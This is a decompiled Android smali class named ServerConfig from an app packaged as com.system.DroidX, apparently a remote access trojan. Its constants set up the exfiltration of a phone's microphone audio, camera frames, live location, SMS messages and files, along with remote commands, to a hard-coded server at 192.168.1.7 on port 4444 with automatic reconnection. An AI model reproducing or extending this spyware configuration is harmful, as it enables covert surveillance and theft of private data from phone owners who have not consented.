.class public Lcom/system/DroidX/ServerConfig;
.super Ljava/lang/Object;
.source "ServerConfig.java"


# static fields
.field public static final MSG_AUDIO_CHUNK:Ljava/lang/String; = "AUD:"

.field public static final MSG_CAMERA_FRAME:Ljava/lang/String; = "CAM:"

.field public static final MSG_COMMAND:Ljava/lang/String; = "CMD:"

.field public static final MSG_FILE_CHUNK:Ljava/lang/String; = "FCH:"

.field public static final MSG_FILE_END:Ljava/lang/String; = "FEN:"

.field public static final MSG_FILE_START:Ljava/lang/String; = "FIL:"

.field public static final MSG_LIVE_LOCATION:Ljava/lang/String; = "LOC:"

.field public static final MSG_LIVE_SMS:Ljava/lang/String; = "SMS:"

.field public static final MSG_RESPONSE:Ljava/lang/String; = "RES:"

.field public static final RECONNECT_DELAY:Ljava/lang/String; = "1000"

.field public static final SERVER_IP:Ljava/lang/String; = "192.168.1.7"

.field public static final SERVER_PORT:Ljava/lang/String; = "4444"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 3
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static getReconnectDelay()I
    .locals 1

    .line 14
    const-string v0, "1000"

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    return v0
.end method

.method public static getServerPort()I
    .locals 1

    .line 10
    const-string v0, "4444"

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    return v0
.end method
